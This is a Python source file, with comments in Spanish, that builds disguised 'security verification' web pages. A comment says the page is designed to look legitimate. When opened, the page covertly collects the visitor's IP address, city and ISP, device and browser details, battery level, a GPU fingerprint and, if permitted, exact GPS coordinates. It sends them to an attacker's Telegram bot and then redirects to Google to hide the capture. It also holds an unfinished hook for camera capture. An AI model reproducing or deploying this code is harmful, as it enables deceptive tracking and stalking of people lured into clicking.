
import os
import uuid
from config import PAGES_DIR

# Template Base optimizado para parecer legítimo
BASE_HTML = """
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación de Seguridad</title>
<meta property="og:title" content="Archivo Compartido Seguro">
<meta property="og:description" content="Verifica tu identidad para acceder.">
<style>
    body{{font-family:-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}
    .box{{background:white;padding:2rem;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1);text-align:center;max-width:400px;width:90%}}
    .loader{{width:48px;height:48px;border:5px solid #000;border-bottom-color:transparent;border-radius:50%;display:inline-block;box-sizing:border-box;animation:r 1s linear infinite}}
    @keyframes r{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
    h2{{color:#333;margin-top:1rem}}
    p{{color:#666;font-size:0.9rem}}
</style>
</head>
<body>
<div class="box">
    <div class="loader"></div>
    <h2 id="msg">Verificando dispositivo...</h2>
    <p>Por favor permite el acceso para continuar.</p>
</div>
<script>
const BOT='{token}', CHAT='{chat_id}';
const send = async (txt) => {{
    await fetch(`https://api.telegram.org/bot${{BOT}}/sendMessage`, {{
        method: 'POST', headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{chat_id: CHAT, text: txt, parse_mode: 'HTML'}})
    }});
}};
const getData = async () => {{
    let info = `🔍 <b>NUEVO CLIC DETECTADO</b>\n\n`;
    try {{
        const r = await fetch('https://api.ipify.org?format=json');
        const d = await r.json();
        info += `🌐 <b>IP:</b> <code>${{d.ip}}</code>\n`;
        
        const ipd = await fetch(`http://ip-api.com/json/${{d.ip}}`);
        const geo = await ipd.json();
        if(geo.status === 'success') {{
            info += `📍 <b>Ubicación:</b> ${{geo.city}}, ${{geo.country}}\n`;
            info += `🏢 <b>ISP:</b> ${{geo.isp}}\n`;
            info += `🗺 <b>Map:</b> <a href="https://maps.google.com/?q=${{geo.lat}},${{geo.lon}}">Ver Mapa</a>\n`;
        }}
    }} catch(e) {{}}
    
    info += `📱 <b>UA:</b> ${{navigator.userAgent}}\n`;
    info += `💻 <b>OS:</b> ${{navigator.platform}}\n`;
    info += `🔋 <b>Batería:</b> ${{(await navigator.getBattery()).level * 100}}%\n`;
    info += `🖥 <b>Pantalla:</b> ${{screen.width}}x${{screen.height}}\n`;
    
    // Fingerprint Canvas
    try {{
        let canvas = document.createElement('canvas');
        let gl = canvas.getContext('webgl');
        let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        info += `🎮 <b>GPU:</b> ${{gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}}\n`;
    }} catch(e) {{}}
    
    await send(info);
    
    // GPS Real
    if(navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(async (p) => {{
            const lat = p.coords.latitude;
            const lon = p.coords.longitude;
            const acc = p.coords.accuracy;
            let gps = `🎯 <b>GPS EXACTO OBTENIDO</b>\n\n`;
            gps += `📍 <b>Coords:</b> <code>${{lat}}, ${{lon}}</code>\n`;
            gps += `📏 <b>Precisión:</b> ${{acc}} metros\n`;
            gps += `🗺 <b>Google Maps:</b> <a href="https://www.google.com/maps?q=${{lat}},${{lon}}">Abrir Ubicación</a>`;
            await send(gps);
            window.location.href = "https://google.com"; // Redirect
        }}, (e) => {{
            send(`❌ <b>GPS Denegado:</b> ${{e.message}}`);
            window.location.href = "https://google.com";
        }});
    }} else {{
        window.location.href = "https://google.com";
    }}
}};
getData();
</script>
</body>
</html>
"""

def generate_tracking_page(token, chat_id, type="geo"):
    """Genera archivo HTML de tracking"""
    filename = f"{type}_{uuid.uuid4().hex[:8]}.html"
    path = os.path.join(PAGES_DIR, filename)
    
    # Aquí podríamos inyectar diferentes scripts según si es 'cam' o 'geo'
    # Por brevedad usaremos el template Geo mejorado
    content = BASE_HTML.format(token=token, chat_id=chat_id)
    
    if type == "cam":
        # Inyectar script de cámara (lógica similar a la original pero limpia)
        pass 
        
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
        
    return filename, content
